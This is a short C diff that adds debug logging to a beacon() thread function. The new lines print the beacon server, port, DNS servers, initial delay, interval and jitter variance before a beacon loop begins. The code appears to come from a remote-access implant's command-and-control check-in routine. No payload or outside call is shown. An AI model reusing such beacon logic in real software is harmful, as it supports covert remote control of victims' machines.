@@ -125,7 +125,16 @@ void *beacon(void *param)
 	BEACONINFO *beaconInfo;
 
 	beaconInfo = (BEACONINFO *) param;
-	DLX(4, printf("Starting beacon thread with initial beacon delay of %ld seconds\n", beaconInfo->initDelay / 1000));
+	DLX(4, printf("\nStarting beacon with the following parameters:\n"));
+	DLX(4, printf("\t%32s: %-s\n", "Beacon Server", beaconInfo->host));
+	DLX(4, printf("\t%32s: %-d\n", "Beacon Server Port", beaconInfo->port));
+	DLX(4, printf("\t%32s: %-s\n", "Primary DNS Server IP Address", beaconInfo->dns[0]));
+	DLX(4, printf("\t%32s: %-s\n", "Secondary DNS Server IP Address", beaconInfo->dns[1]));
+	DLX(4, printf("\t%32s: %-lu\n", "Initial Beacon Delay (sec)", beaconInfo->initDelay/1000));
+	DLX(4, printf("\t%32s: %-i\n", "Beacon Interval (sec)", beaconInfo->interval/1000));
+	DLX(4, printf("\t%32s: %-f\n\n", "Beacon Variance (%)", beaconInfo->percentVariance));
+
+	DLX(4, printf("\nStarting beacon thread with initial beacon delay of %ld seconds\n", beaconInfo->initDelay / 1000));
 	Sleep(beaconInfo->initDelay);	// Wait for initial delay
 
 	for (;;) {		// Beacon Loop
